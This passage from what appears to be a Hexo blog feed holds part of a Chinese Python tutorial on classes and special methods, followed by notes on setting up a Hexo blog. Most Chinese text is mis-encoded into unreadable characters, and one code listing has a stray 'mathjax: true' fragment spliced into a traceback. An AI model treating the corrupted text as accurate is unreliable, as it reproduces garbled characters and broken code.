å°±è¡¨ç¤ºå½“å‰è°ƒç”¨æ–¹æ³•çš„å¯¹è±¡è‡ªå·±</p></li><li><p>è°ƒç”¨æ–¹æ³•æ—¶ï¼Œç¨‹åºå‘˜ä¸éœ€è¦ä¼ é€’ self å‚æ•°</p></li><li><p>åœ¨æ–¹æ³•å†…éƒ¨ï¼ˆå®šä¹‰æ–¹æ³•æ—¶ï¼Œ self ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå¦åˆ™å°±ä¸èƒ½é€šè¿‡<code>self.</code> è®¿é—®å¯¹è±¡çš„æ–¹æ³•äº†ï¼‰</p><ul><li><p>é€šè¿‡ <code>self.</code>è®¿é—®å¯¹è±¡çš„å±æ€§</p></li><li><p>é€šè¿‡ <code>self.</code>è°ƒç”¨å¯¹è±¡å…¶ä»–çš„æ–¹æ³•</p></li></ul></li></ul><h2 id="å†…ç½®æ–¹æ³•å’Œå±æ€§">å†…ç½®æ–¹æ³•å’Œå±æ€§</h2><h3 id="dir-æŸ¥çœ‹å±æ€§æ–¹æ³•">dir æŸ¥çœ‹å±æ€§ã€æ–¹æ³•</h3><p>åœ¨ Pythonä¸­<strong>å¯¹è±¡å‡ ä¹æ˜¯æ— æ‰€ä¸åœ¨çš„</strong>ï¼Œæˆ‘ä»¬ä¹‹å‰å­¦ä¹ çš„å˜é‡ã€æ•°æ®ã€å‡½æ•°éƒ½æ˜¯å¯¹è±¡åœ¨Python ä¸­å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸¤ä¸ªæ–¹æ³•éªŒè¯</p><p>The <em>dir</em>() method tries to return a list of valid attributesof the object.</p><ol type="1"><li><p>åœ¨<strong>æ ‡è¯†ç¬¦/æ•°æ®</strong>åè¾“å…¥ä¸€ä¸ª<code>,</code>,ç„¶åæŒ‰ä¸‹<code>TAB</code> é”®ï¼Œ<code>ipython</code>ä¼šæç¤ºè¯¥å¯¹è±¡èƒ½å¤Ÿè°ƒç”¨çš„æ–¹æ³•åˆ—è¡¨</p></li><li><p>ä½¿ç”¨å†…ç½®å‡½æ•°<code>dir</code>ä¼ å…¥æ ‡è¯†ç¬¦/æ•°æ®,å¯ä»¥æŸ¥çœ‹å¯¹è±¡å†…çš„æ‰€æœ‰å±æ€§åŠæ–¹æ³•</p></li></ol><p>æç¤º: <code>__æ–¹æ³•å__</code> æ ¼å¼çš„æ–¹æ³•æ˜¯ <code>Python</code>æä¾›çš„<strong>å†…ç½®æ–¹æ³•/å±æ€§</strong>,ç¨åä¼šç»™å¤§å®¶ä»‹ç»ä¸€äº›å¸¸ç”¨çš„<code>å†…ç½®æ–¹æ³•/å±æ€§</code></p><p><code>__doc__</code> å±æ€§è¿”å›å¯¹è±¡/å‡½æ•°çš„æ³¨é‡Šï¼ˆä¸‰å¼•å·åŒ…å›´çš„æ³¨é‡Šï¼‰</p><table><thead><tr class="header"><th>åºå·</th><th>æ–¹æ³•å</th><th>ç±»å‹</th><th>ä½œç”¨</th></tr></thead><tbody><tr class="odd"><td>01</td><td><code>__new__</code></td><td>æ–¹æ³•</td><td>åˆ›å»ºå¯¹è±¡æ—¶ï¼Œä¼šè¢«è‡ªåŠ¨è°ƒç”¨</td></tr><tr class="even"><td>02</td><td><code>__init__</code></td><td>æ–¹æ³•</td><td>å¯¹è±¡è¢«åˆå§‹åŒ–æ—¶ï¼Œä¼šè¢«è‡ªåŠ¨è°ƒç”¨</td></tr><tr class="odd"><td>03</td><td><code>__del__</code></td><td>æ–¹æ³•</td><td>å¯¹è±¡è¢«ä»å†…å­˜ä¸­é”€æ¯å‰ï¼Œä¼šè¢«è‡ªåŠ¨è°ƒç”¨</td></tr><tr class="even"><td>04</td><td><code>__str__</code></td><td>æ–¹æ³•</td><td>è¿”å›å¯¹è±¡çš„æè¿°ä¿¡æ¯ï¼Œprint l å‡½æ•°è¾“å‡ºä½¿ç”¨</td></tr></tbody></table><p>å½“ä½¿ç”¨<code>ç±»å( )</code> åˆ›å»ºå¯¹è±¡æ—¶ï¼Œä¼šè‡ªåŠ¨æ‰§è¡Œä»¥ä¸‹æ“ä½œ</p><ol type="1"><li>ä¸ºå¯¹è±¡åœ¨å†…å­˜ä¸­<strong>åˆ†é…ç©ºé—´</strong> â€” åˆ›å»ºå¯¹è±¡(create, ä½¿ç”¨<code>__new__()</code> æ–¹æ³•)</li><li>ä¸ºå¯¹è±¡çš„å±æ€§<strong>è®¾ç½®åˆå§‹å€¼</strong> â€” åˆå§‹åŒ–æ–¹æ³•ï¼ˆinitï¼Œä½¿ç”¨<code>__init__()</code> æ–¹æ³•)</li></ol><p>å…¶ä¸­<code>__new__</code>ä¸<code>__init__</code>çš„ä½œç”¨ç›¸å½“äº C++ä¸­çš„æ„é€ å‡½æ•°ï¼Œ<code>__del__</code> ç›¸å½“äºææ„å‡½æ•°ã€‚</p><h3 id="new__"><code>__new__</code></h3><p><strong>new</strong> is static class method,</p><p>Use <strong>new</strong> when you need to control the creation of anew instance.</p><p><strong>new</strong> is the first step of instance creation. It'scalled first, and is responsible for returning a new instance of yourclass.</p><h3 id="init__"><code>__init__</code></h3><p><strong>init</strong> is instance method, <strong>new</strong> has tocreate the instance first, so <strong>init</strong> can initializeit.</p><p>Use <strong>init</strong> when you need to control initialization ofa new instance.</p><p><strong>init</strong> doesn't return anything; it's only responsiblefor initializing the instance after it's been created.</p><p>Note that <strong>init</strong> takes self as parameter. Until youcreate instance there is no self.</p><ul><li><p><code>__init__</code>æ˜¯å¯¹è±¡çš„å†…ç½®æ–¹æ³•ï¼Œä¸“é—¨ç”¨æ¥å®šä¹‰ä¸€ä¸ªç±»å…·æœ‰å“ªäº›å±æ€§</p></li><li><p>åœ¨ <code>__init__</code> æ–¹æ³•å†…éƒ¨ä½¿ç”¨<code>self.å±æ€§å=å±æ€§çš„åˆå§‹å€¼</code> å°±å¯ä»¥å®šä¹‰å±æ€§</p></li><li><p>å®šä¹‰å±æ€§ä¹‹åï¼Œå†ä½¿ç”¨ Cat ç±»åˆ›å»ºçš„å¯¹è±¡ï¼Œéƒ½ä¼šæ‹¥æœ‰è¯¥å±æ€§</p></li></ul><p>åœ¨å¼€å‘ä¸­ï¼Œå¦‚æœå¸Œæœ›åœ¨åˆ›å»ºå¯¹è±¡çš„åŒæ—¶ï¼Œå°±è®¾ç½®å¯¹è±¡çš„å±æ€§ï¼Œå¯ä»¥å¯¹<code>__init__</code> æ–¹æ³•è¿›è¡Œæ”¹é€ </p><ol type="1"><li>æŠŠå¸Œæœ›è®¾ç½®çš„å±æ€§å€¼ï¼Œå®šä¹‰æˆ <code>__init__</code> æ–¹æ³•çš„å‚æ•°</li><li>åœ¨æ–¹æ³•å†…éƒ¨ä½¿ç”¨ <code>self.å±æ€§=å½¢å‚</code> æ¥æ”¶å¤–éƒ¨ä¼ é€’çš„å‚æ•°</li><li>åœ¨åˆ›å»ºå¯¹è±¡æ—¶ï¼Œä½¿ç”¨<code>ç±»åï¼ˆå±æ€§ 1. å±æ€§ 2, ...ï¼‰</code> è°ƒç”¨</li></ol><h3 id="del__"><code>__del__</code></h3><ul><li><p>åœ¨ Python ä¸­</p><ul><li>å½“ä½¿ç”¨ <code>ç±»å()</code>åˆ›å»ºå¯¹è±¡æ—¶ï¼Œä¸ºå¯¹è±¡<code>åˆ†é…å®Œç©ºé—´</code>åï¼Œ<code>è‡ªåŠ¨</code>è°ƒç”¨<code>__init__</code>æ–¹æ³•</li><li>å½“ä¸€ä¸ª<code>å¯¹è±¡è¢«ä»å†…å­˜ä¸­é”€æ¯</code> å‰ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨<code>__del__</code> æ–¹æ³•</li></ul></li><li><p>åº”ç”¨åœºæ™¯</p><p>o <code>__init__</code>æ”¹é€ åˆå§‹åŒ–æ–¹æ³•ï¼Œå¯ä»¥è®©åˆ›å»ºå¯¹è±¡æ›´åŠ çµæ´»</p><p>o<code>__del__</code>å¦‚æœå¸Œæœ›åœ¨å¯¹è±¡è¢«é”€æ¯å‰ï¼Œå†åšä¸€äº›äº‹æƒ…ï¼Œå¯ä»¥è€ƒè™‘ä¸€ä¸‹<code>__del__</code>æ–¹æ³•</p></li></ul><h3 id="str__"><code>__str__</code></h3><p><code>__str__</code> æ–¹æ³•è‡ªå®šä¹‰å˜é‡ä¿¡æ¯ï¼Œæ³¨æ„è¯¥æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>():</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        return string</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;this is a class for test!&#x27;</span></span><br><span class="line">  ...</span><br><span class="line">  tom = Cat()</span><br><span class="line">  <span class="built_in">print</span>(tom)</span><br><span class="line"></span><br><span class="line">  output:</span><br><span class="line">  this <span class="keyword">is</span> a <span class="keyword">class</span> <span class="title class_">for</span> test!</span><br></pre></td></tr></table></figure><h2 id="ç”Ÿå‘½å‘¨æœŸ">ç”Ÿå‘½å‘¨æœŸ</h2><ol type="1"><li><p>è°ƒç”¨ <code>ç±»åï¼ˆï¼‰</code>å , è‡ªåŠ¨è°ƒç”¨ç±»çš„<code>__new__()</code> æ–¹æ³•ï¼Œåˆ›å»ºå¯¹è±¡ï¼Œç”Ÿå‘½å‘¨æœŸå¼€å§‹</p></li><li><p>è‡ªåŠ¨è°ƒç”¨ <code>__init__()</code>æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–(åˆå§‹åŒ–å±æ€§ç­‰)</p></li><li><p>åœ¨å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸå†…ï¼Œå¯ä»¥è®¿é—®å¯¹è±¡å±æ€§ï¼Œæˆ–è€…è®©å¯¹è±¡è°ƒç”¨æ–¹æ³•</p></li><li><p>å±€éƒ¨å˜é‡ï¼ˆå±€éƒ¨å¯¹è±¡ï¼‰çš„ç”Ÿå‘½å‘¨æœŸå°±æ˜¯åœ¨å‡½æ•°å†…ï¼Œå‡½æ•°æ‰§è¡Œå®Œï¼Œè‡ªåŠ¨è°ƒç”¨<code>__del__</code> ï¼Œå…¨å±€å˜é‡çš„ç”Ÿå‘½å‘¨æœŸæ˜¯å…¨å±€ï¼Œç¨‹åºè¿è¡Œç»“æŸï¼Œè‡ªåŠ¨è°ƒç”¨<code>__del__</code></p></li><li><p>ä¸€ä¸ªå¯¹è±¡çš„ <code>__del__</code>æ–¹æ³•ä¸€æ—¦è¢«è°ƒç”¨ï¼Œç”Ÿå‘½å‘¨æœŸç»“æŸ</p></li></ol><h2 id="å°è£…">å°è£…</h2><ol type="1"><li>å°è£…æ˜¯é¢å‘å¯¹è±¡ç¼–ç¨‹çš„ä¸€å¤§ç‰¹ç‚¹</li><li>é¢å‘å¯¹è±¡ç¼–ç¨‹çš„ç¬¬ä¸€æ­¥ä¸€-å°†å±æ€§å’Œæ–¹æ³•å°è£…åˆ°ä¸€ä¸ªæŠ½è±¡çš„ç±»ä¸­</li><li>å¤–ç•Œä½¿ç”¨ç±»åˆ›å»ºå¯¹è±¡ï¼Œç„¶åè®©å¯¹è±¡è°ƒç”¨æ–¹æ³•</li><li>å¯¹è±¡æ–¹æ³•çš„ç»†èŠ‚éƒ½è¢«å°è£…åœ¨ç±»çš„å†…éƒ¨</li></ol><p>å®šä¹‰æ²¡æœ‰åˆå§‹å€¼çš„å±æ€§</p><p>åœ¨å®šä¹‰å±æ€§æ—¶ï¼Œå¦‚æœä¸çŸ¥é“è®¾ç½®ä»€ä¹ˆåˆå§‹å€¼ï¼Œå¯ä»¥è®¾ç½®ä¸º None</p><ul><li><p>None å…³é”®å­—è¡¨ç¤ºä»€ä¹ˆéƒ½æ²¡æœ‰</p></li><li><p>è¡¨ç¤ºä¸€ä¸ªç©ºå¯¹è±¡ï¼Œæ²¡æœ‰æ–¹æ³•å’Œå±æ€§ï¼Œæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å¸¸é‡</p></li><li><p>å¯ä»¥å°† None å€¼ç»™ä»»ä½•ä¸€ä¸ªå˜é‡</p></li></ul><h2 id="æ¡ä»¶åˆ¤æ–­">æ¡ä»¶åˆ¤æ–­</h2><p>å½“ä¸€ä¸ªå¯¹è±¡æƒ³è¦æ‰§è¡Œä¸€ä¸ªæ–¹æ³•æ—¶ï¼Œéœ€è¦é¦–å…ˆåˆ¤æ–­å®ƒæœ‰æ²¡æœ‰æ»¡è¶³æ‰§è¡Œè¯¥æ–¹æ³•çš„æ¡ä»¶ã€‚</p><h2 id="èº«ä»½è¿ç®—ç¬¦">èº«ä»½è¿ç®—ç¬¦</h2><p>èº«ä»½è¿ç®—ç¬¦ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡çš„å†…å­˜åœ°å€æ˜¯å¦ä¸€è‡´ï¼Œå³ï¼šæ˜¯å¦æ˜¯å¯¹åŒä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨</p><ul><li>åœ¨ Python ä¸­é’ˆå¯¹ None æ¯”è¾ƒæ—¶ï¼Œå»ºè®®ä½¿ç”¨ <code>is</code>åˆ¤æ–­è¿ç®—ç¬¦æè¿°å®ä¾‹</li></ul><table><colgroup><col style="width: 7%" /><col style="width: 51%" /><col style="width: 40%" /></colgroup><thead><tr class="header"><th>è¿ç®—ç¬¦</th><th>æè¿°</th><th>å®ä¾‹</th></tr></thead><tbody><tr class="odd"><td>is</td><td>is æ˜¯åˆ¤æ–­ä¸¤ä¸ªæ ‡è¯†ç¬¦æ˜¯ä¸æ˜¯å¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡</td><td>x is yï¼Œ ç±»ä¼¼ id (x) = id(y)</td></tr><tr class="even"><td>is not</td><td>is not æ˜¯åˆ¤æ–­ä¸¤ä¸ªæ ‡è¯†ç¬¦æ˜¯ä¸æ˜¯å¼•ç”¨ä¸åŒå¯¹è±¡</td><td>x is not y, ç±»ä¼¼ id (x)ï¼= id(y)</td></tr></tbody></table><p>is xisyï¼Œç±»ä¼¼ is notï¼š X Is not yï¼Œç±»ä¼¼ ida) l=id ()</p><p>is ç”¨äºåˆ¤æ–­ä¸¤ä¸ªå˜é‡å¼•ç”¨å¯¹è±¡æ˜¯å¦ä¸ºåŒä¸€ä¸ªï¼ˆå³ï¼šå†…å­˜åœ°å€æ˜¯å¦ä¸€è‡´ï¼‰</p><p>== ç”¨äºåˆ¤æ–­å¼•ç”¨å˜é‡çš„<strong>å€¼</strong>æ˜¯å¦ç›¸ç­‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">5</span>]: a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: a</span><br><span class="line">Out[<span class="number">6</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: <span class="built_in">id</span>(a)</span><br><span class="line">Out[<span class="number">7</span>]: <span class="number">4512288848</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: b=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: <span class="built_in">id</span>(b)</span><br><span class="line">Out[<span class="number">9</span>]: <span class="number">4514154608</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: a == b</span><br><span class="line">Out[<span class="number">10</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: a <span class="keyword">is</span> b</span><br><span class="line">Out[<span class="number">11</span>]: <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: a <span class="keyword">is</span> <span class="keyword">not</span> b</span><br><span class="line">Out[<span class="number">12</span>]: <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="ç§æœ‰å±æ€§å’Œç§æœ‰æ–¹æ³•">ç§æœ‰å±æ€§å’Œç§æœ‰æ–¹æ³•</h2><h3 id="åº”ç”¨åœºæ™¯åŠå®šä¹‰æ–¹å¼">åº”ç”¨åœºæ™¯åŠå®šä¹‰æ–¹å¼</h3><p>åº”ç”¨åœºæ™¯</p><ul><li><p>åœ¨å®é™…å¼€å‘ä¸­ï¼Œ<strong>å¯¹è±¡</strong>çš„<strong>æŸäº›å±æ€§æˆ–æ–¹æ³•</strong>å¯èƒ½åªå¸Œæœ›<strong>åœ¨å¯¹è±¡çš„å†…éƒ¨è¢«ä½¿ç”¨</strong>ï¼Œè€Œ<strong>ä¸å¸Œæœ›åœ¨å¤–éƒ¨è¢«è®¿é—®åˆ°</strong></p></li><li><p><strong>ç§æœ‰å±æ€§</strong>å°±æ˜¯<strong>å¯¹è±¡</strong>ä¸å¸Œæœ›å…¬å¼€çš„<strong>å±æ€§</strong></p></li><li><p><strong>ç§æœ‰æ–¹æ³•</strong>å°±æ˜¯<strong>å¯¹è±¡</strong>ä¸å¸Œæœ›å…¬å¼€çš„<strong>æ–¹æ³•</strong></p></li></ul><p>å®šä¹‰æ–¹å¼</p><ul><li>åœ¨<strong>å®šä¹‰å±æ€§æˆ–æ–¹æ³•æ—¶</strong>ï¼Œåœ¨<strong>å±æ€§åæˆ–è€…æ–¹æ³•åå‰</strong>å¢åŠ <strong>ä¸¤ä¸ªä¸‹åˆ’çº¿</strong>ï¼Œå®šä¹‰çš„å°±æ˜¯<strong>ç§æœ‰</strong>å±æ€§æˆ–æ–¹æ³•</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Women</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.__age = <span class="number">18</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__secret</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span>&#x27;s age is <span class="subst">&#123;self.__age&#125;</span>&quot;</span>)</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure><h2 id="ä¼ªç§æœ‰å±æ€§å’Œç§æœ‰æ–¹æ³•">ä¼ªç§æœ‰å±æ€§å’Œç§æœ‰æ–¹æ³•</h2><p>æç¤ºï¼šåœ¨æ—¥å¸¸å¼€å‘ä¸­ï¼Œ<strong>ä¸è¦ä½¿ç”¨è¿™ç§æ–¹å¼ã€è®¿é—®å¯¹è±¡çš„ç§æœ‰å±æ€§æˆ–ç§æœ‰æ–¹æ³•</strong></p><p>Python ä¸­ï¼Œå¹¶æ²¡æœ‰<strong>çœŸæ­£æ„ä¹‰</strong>çš„<strong>ç§æœ‰</strong></p><p>åœ¨ç»™<strong>å±æ€§ã€æ–¹æ³•</strong>å‘½åæ—¶ï¼Œå®é™…æ˜¯å¯¹<strong>åç§°</strong>åšäº†ä¸€äº›ç‰¹æ®Šå¤„ç†ï¼Œä½¿å¾—å¤–ç•Œæ— æ³•è®¿é—®åˆ°</p><p>å¤„ç†æ–¹å¼ï¼šåœ¨<strong>åç§°</strong>å‰é¢åŠ ä¸Š<code>_ç±»å-&gt;_ç±»å__åç§°</code>,å³: <code>[å•ä¸‹åˆ’çº¿][ç±»å][åŒä¸‹åˆ’çº¿][åç§°]</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(xiaofang._Women__age)</span><br><span class="line">xiaofang._Women__secret()</span><br></pre></td></tr></table></figure><h2 id="è¡¥å……">è¡¥å……</h2><p>id( object )</p><blockquote><p>Return the identity of an object.</p><p>This is guaranteed to be unique among simultaneously existingobjects. (CPython uses the object's memory address.)</p></blockquote><p>del</p><blockquote><p>The <code>del</code> keyword is used to delete objects. In Pythoneverything is an object, so the <code>del</code> keyword can also beused to delete variables, lists, or parts of a list etc.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">10</span>]: li=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: <span class="keyword">del</span> li[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: li</span><br><span class="line">Out[<span class="number">12</span>]: [<span class="number">1</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">13</span>]: <span class="keyword">del</span> li</span><br><span class="line"></span><br><span class="line">In [<span class="number">14</span>]: li</span><br><span class="line">------------------------------------------------------------------------mathjax: true</span><br><span class="line">---NameError                                 Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">14</span>-3fab4c9c2cf3&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> li</span><br><span class="line"></span><br><span class="line">NameError: name <span class="string">&#x27;li&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure><p>print</p><p>ä½¿ç”¨ * è¡¨ç¤ºé‡å¤è¾“å‡ºå¤šæ¬¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>*<span class="number">50</span>)</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªå¯¹è±¡çš„å±æ€§å¯ä»¥æ˜¯å¦å¤–ä¸€ä¸ªç±»åˆ›å»ºçš„å¯¹è±¡</p><p>å‚è€ƒèµ„æ–™: <ahref="https://stackoverflow.com/questions/674304/why-is-init-always-called-after-new">Whyis <code>__init__()</code> always called after<code>__new__()</code>?</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo åšå®¢é…ç½®</title>
      <link href="/blog/2020/03/15/misc/hexo_config/"/>
      <url>/blog/2020/03/15/misc/hexo_config/</url>
      
        <content type="html"><![CDATA[<h2 id="maupassant-hexo-with-github-action">maupassant-hexo with githubaction</h2><p>ç…§ç€æ•™ç¨‹æ¥ï¼š<ahref="https://www.haomwei.com/technology/maupassant-hexo.html">å¤§é“è‡³ç®€â€”â€”Hexoç®€æ´ä¸»é¢˜æ¨è | å± Â·åŸ</a></p><h3 id="åšå®¢é…ç½®æ³¨æ„">åšå®¢é…ç½®æ³¨æ„</h3><ol type="1"><li><p>self_search</p><ol type="1"><li>set <code>self_search: true</code> in maupassant<code>__config.yml</code></li><li><code>npm instal hexo-generator-search --save</code></li></ol></li><li><p>word counter</p><ol type="1"><li>set <code>wordcount: true</code> in maupassant<code>__config.yml</code></li><li><code>npm install hexo-wordcount --save</code></li></ol><p>If you want to display the word counter and the reading time expectedto spend of each post please set the value to true, and you must havehexo-wordcount installed.</p></li><li><p>add sitemap for spider</p><ol type="1"><li><p><code>npm install hexo-generator-sitemap --save</code></p></li><li><p>add the following line to hexo <code>__config.yml</code></p></li></ol><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Plugins:</span><br><span class="line">- hexo-generator-sitemap</span><br><span class="line"></span><br><span class="line">sitemap:</span><br><span class="line">    path: sitemap.xml</span><br></pre></td></tr></table></figure></p></li><li><p>å¢åŠ  google analysis Universal Analytics property çš„ id æ˜¯<code>UA-xxx</code>, è€Œ Google Analytics 4 çš„ id æ˜¯ <code>G-xx</code>Universal Analytics property å·²ç»è¢« Google Analytics 4æ›´æ–°è¿­ä»£æ›¿æ¢äº†ã€‚</p></li><li><p>æäº¤ google search æ”¶å½•</p><p>æ‰“å¼€<code>https://search.google.com/search-console</code>ï¼Œå› ä¸ºæœ¬æ¬¡éƒ¨ç½²å¹¶æœªä½¿ç”¨è‡ªå®šä¹‰åŸŸåï¼Œgithub page ä¹Ÿæ²¡æœ‰ DNS å¯ä»¥é¢å¤–è®¾ç½®ï¼Œå› æ­¤é€‰æ‹© URL éªŒè¯ï¼š</p><ol type="1"><li><p><code>https://realyee.github.io/</code></p><p>é€‰æ‹© HTML æ–‡ä»¶ä¸‹è½½æ–¹å¼ï¼Œç„¶åå°† HTML é—®ä»·æ”¾åˆ° hexo æ ¹ç›®å½•çš„ sourceæ–‡ä»¶å¤¹ä¸­ï¼Œå¹¶åœ¨è¯¥ HTML æ–‡ä»¶å¼€å¤´åŠ ä¸Šä»¥ä¸‹å››è¡Œï¼Œé˜²æ­¢ hexo æ¸²æŸ“ã€‚</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">layout: false</span><br><span class="line">---</span><br><span class="line"></span><br></pre></td></tr></table></figure></p></li><li><p><code>https://realyee.github.io/blog/</code></p><p>ä¹‹å‰æ·»åŠ è¿‡ google analysisï¼Œ maupassant ä¸»é¢˜åœ¨ç½‘é¡µåŠ å…¥äº† gtagä¹‹ç±»çš„ï¼Œç›´æ¥éªŒè¯æˆåŠŸï¼Œç„¶åæäº¤ sitemap å³å¯ã€‚</p></li></ol></li><li><p>ä»»æ„ä¸€ä¸ª github ä»“åº“éƒ½å¯ä»¥å¼€å¯ github pagesåŠŸèƒ½ï¼Œå¯ä»¥è€ƒè™‘å°†å­¦æœ¯ä¸»é¡µéƒ¨ç½²åœ¨ github page ä¸»é¡µï¼Œå°†åšå®¢éƒ¨ç½²åœ¨ blogé¡¹ä¸­</p><p>æ­å»º hexo-theme-academia ä¸»é¢˜å­¦æœ¯ä¸»é¡µ, åœ¨ hexo çš„<code>__config.yml</code> ä¸­çš„ index_generator çš„ path åŠ ä¸Š<code>/home</code> æ¥å±•ç¤ºä¸»é¡µ,ç„¶ååœ¨ <code>source</code> ç›®å½•ä¸‹åˆ›å»º<code>home/index.md</code>, æ³¨æ„è¦åœ¨å…¶ front-matter ä¸­åŠ å…¥<code>permalink: index.html</code></p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index_generator:</span><br><span class="line">path: &quot;/home&quot;</span><br><span class="line">per_page: 10</span><br><span class="line">order_by: -date</span><br></pre></td></tr></table></figure></p><p>è¿™æ ·çš„è¯ï¼Œè‡ªå·±ä¸€äº› web é¡¹ç›®ä¹Ÿå¯ä»¥å¼€å¯ Github pageæ˜ å°„åˆ°ç½‘ç»œä¸Šæ¥ã€‚</p></li><li><p>ä½¿ç”¨ git éƒ¨ç½² åœ¨ä¸¤ä¸ª hexo ä»“åº“ç›®å½•ä¸‹éƒ½æ‰§è¡Œ<code>npm install --save hexo-deployer-git</code></p></li><li><p>mathjax æ¸²æŸ“å¤šè¡Œå…¬å¼å¤±è´¥ï¼Œä½¿ç”¨ pandoc æ­£ç¡®æ¸²æŸ“å¤šè¡Œ MathJaxå…¬å¼</p><p>Hexo å®˜æ–¹çš„é»˜è®¤æ¸²æŸ“æ’ä»¶ hexo-theme-markedè™½ç„¶èƒ½æ»¡è¶³å¤§éƒ¨åˆ†æ¸²æŸ“è¦æ±‚ï¼Œä½†ä¹Ÿå­˜åœ¨ç€ä»¥ä¸‹ä¸è¶³ï¼ˆé’ˆå¯¹ v4.0.0 ç‰ˆæœ¬ï¼‰ï¼š</p><ul><li>ä¸æ”¯æŒ Github-Flavoured-Markdown çš„è¡¨æƒ…ï¼šğŸ˜„</li><li>ä¸æ”¯æŒä¸Šä¸‹è„šæ ‡</li><li>è„šæ³¨ä¸æ”¯æŒ</li><li>ç›®å½•[TOC]ä¸è¢«æ”¯æŒ</li><li>ä¸æ”¯æŒ MathJax æ•°å­¦å…¬å¼æ¢è¡Œ</li></ul><p>å¸è½½ 